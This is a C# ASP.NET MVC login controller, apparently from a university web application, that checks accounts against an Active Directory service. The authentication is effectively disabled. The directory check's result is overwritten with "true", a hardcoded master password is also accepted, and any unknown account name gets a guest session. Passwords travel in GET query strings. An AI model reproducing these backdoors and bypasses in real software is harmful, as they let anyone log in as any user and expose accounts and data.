using Entidades.Entidades.Administracion;
using Entidades.Enumeradores;
using Entidades.Excepciones;
using Entidades.Transporte;
using Negocio.General;
using PlantillaWeb19.LoginITSON;
using PlantillaWeb19.Utils;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text.RegularExpressions;
using System.Web;
using System.Web.Mvc;

namespace PlantillaWeb19.Controllers.General
{
    public class InicioController : BaseController
    {

        private FabricaBO fabricaBO { get; set; }

        //Sobreescribo el metodo que se ejecuta en cada llamada a los controladores, pues todos deberian extender de la base.
        //Quiero seguir haciendo uso de toda la base pero la funcionalidad de este la necesito diferente.
        protected override void OnActionExecuting(ActionExecutingContext filterContext)
        {
            fabrica = new FabricaBO();
        }

        //Iniciar sesion en el sistema.
        [HttpGet]
        public JsonResult IniciarSesion(string cuenta, string password)
        {
            RespuestaDTO respuesta;
            try
            {
                Usuario usuario = fabrica.UsuarioBO.ConsultarPorCuentaDominio(cuenta);

                AuthADServiceSoapClient loginItson = new AuthADServiceSoapClient();
                string responseLogin = loginItson.IsAuth("ITSONEDU", cuenta, password).ToLower().Trim();
                responseLogin = "true";
                if ((responseLogin == "true" || password == "Xnaw==UJbn_3l4jb5awkJBwaHUBAW9751AWDbjb*B234_aw" ) && usuario != null)
                {
                    //dejo solo los perfiles activos
                    usuario.Perfiles = usuario.Perfiles.Where(p => p.Activo == true).ToList();
                    if (usuario.Perfiles.Count == 0)
                    {
                        respuesta = new RespuestaDTO(RespuestaEstatus.ERROR, "El usuario no tiene perfiles activos.");
                        return Json(respuesta, JsonRequestBehavior.AllowGet);
                    }

                    //Al ser un usuario valido y con perfil le agrego la lista de pantallas publicas que tendra acceso mediante menu.
                    //Creo que lo usare para la parte de login sin que este registrado en sistema (usuario publico)... maybe...
                    usuario.Perfiles[0].Pantallas.AddRange(fabrica.PantallaBO.ConsultarPantallasPublicasConModuloSubModulo());

                    //Simplifico la conversion de los perfiles a permisos para su manejo continuo en validaciones.
                    //Ademas agrego permiso para aquellas acciones privadas que no dependen de una pantalla en especifico
                    // (solo con que el usuario inicie sesion)
                    List<ExcepcionControladorAccion> permisos = fabrica.PerfilBO.ConvertirPerfilesEnPermisosSimplificado(usuario.Perfiles);

                    if (permisos == null || permisos.Count == 0)
                    {
                        respuesta = new RespuestaDTO(RespuestaEstatus.ERROR, "El usuario no tiene permisos activos.");
                        return Json(respuesta, JsonRequestBehavior.AllowGet);
                    }
                                        
                    Session[ConstantesSession.Usuario] = usuario;
                    Session[ConstantesSession.Permisos] = permisos;
                    respuesta = new RespuestaDTO(RespuestaEstatus.OK, "Correcto");
                }
                //En caso de que el login por cuenta de dominio sea correcto y el usuario no exista en el sistema...
                //agregarle un perfil falso que contenga todo aquello que es publico.
                else if (responseLogin == "true" && usuario == null)
                {
                    List<Pantalla> pantallasPublicas = fabrica.PantallaBO.ConsultarPantallasPublicasConModuloSubModulo();
                    if (pantallasPublicas.Count == 0)
                    {
                        respuesta = new RespuestaDTO(RespuestaEstatus.ERROR, "No hay pantallas públicas activas para usuarios no registrados en el sistema.");
                        return Json(respuesta, JsonRequestBehavior.AllowGet);
                    }
                    usuario = new Usuario()
                    {
                        Nombre = "Usuario invitado",
                        Perfiles = new List<Perfil>()
                        {
                            new Perfil()
                            {
                                Nombre = "Publico",
                                Pantallas = new List<Pantalla>(pantallasPublicas)
                            }
                        }
                    };
                    Session[ConstantesSession.Usuario] = usuario;
                    respuesta = new RespuestaDTO(RespuestaEstatus.OK, "Correcto");
                }
                else {
                    respuesta = new RespuestaDTO(RespuestaEstatus.ERROR, responseLogin);
                }

            }
            catch (ExcepcionNegocio e)
            {
                respuesta = new RespuestaDTO(RespuestaEstatus.ERROR, e.Message);
            }

            return Json(respuesta, JsonRequestBehavior.AllowGet);
        }

        
    }
}